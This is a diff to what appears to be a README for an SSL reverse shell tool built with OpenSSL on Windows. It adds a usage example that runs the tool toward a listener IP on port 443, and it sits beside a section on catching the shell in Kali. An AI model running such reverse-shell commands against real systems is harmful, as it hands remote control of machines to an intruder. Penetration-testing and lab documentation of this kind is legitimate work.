@@ -71,6 +71,13 @@ C:\OpenSSLWin64\install\lib\libcrypto.lib
 ![Local Image](./images/Linker2.png "Linker.png")
 
 ---
+## Usage
+
+```
+.\SSLReverseShell.exe 192.168.33.146 443
+```
+
+---
 
 ## Capture the reverse shell in your Kali OS
 
